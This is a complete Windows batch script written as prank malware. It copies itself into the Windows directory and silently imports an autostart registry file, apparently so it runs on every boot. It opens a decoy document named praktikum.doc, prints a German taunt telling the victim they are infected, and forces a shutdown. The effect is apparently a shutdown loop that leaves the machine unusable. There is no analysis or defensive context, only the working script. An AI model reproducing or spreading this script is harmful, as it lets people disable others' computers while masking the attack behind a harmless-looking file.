@echo off
copy shutdown.bat %windir%
REGEDIT /S autostart.reg
start praktikum.doc
echo DU NOOB bist nun infiziert hehe
pause
%windir%\system32\shutdown.exe -f -s
